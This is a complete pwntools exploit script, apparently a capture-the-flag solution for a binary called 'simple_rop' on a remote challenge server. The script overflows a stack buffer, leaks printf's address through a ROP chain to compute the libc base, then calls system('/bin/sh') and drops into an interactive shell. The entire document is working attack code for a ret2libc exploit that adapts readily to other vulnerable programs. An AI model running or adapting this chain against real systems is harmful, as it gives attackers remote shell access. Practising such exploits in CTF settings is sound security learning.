from pwn import * 
#context.log_level = 'debug'
#r = process('./simple_rop_patched')
r = remote('0.cloud.chals.io', 13373)
#r = gdb.debug('./simple_rop', 'b *0x00401164\nc')
e = ELF('./simple_rop')
libc = ELF('./libc.so.6')
padding = b'a'*(0x20+8)
pop_rdi = 0x000000000040122b
ret_gadget = 0x0000000000401016
r.sendline(padding+p64(pop_rdi)+p64(e.got['printf'])+p64(ret_gadget)+p64(e.plt['printf'])+p64(e.sym['vuln']))
r.recvuntil(b'\x0a\x3e\x20')
printf_addr = u64(r.recv(6)+b'\x00\x00')
# use libc.rip to get the libc
print(f'printf_addr = {hex(printf_addr)}')
libc.address = printf_addr - libc.sym['printf']
print(f'libc.address = {hex(libc.address)}')
assert libc.address & 0xfff == 0 
r.sendline(padding+p64(pop_rdi)+p64(next(libc.search(b'/bin/sh\x00')))+p64(libc.sym['system']))
r.interactive()


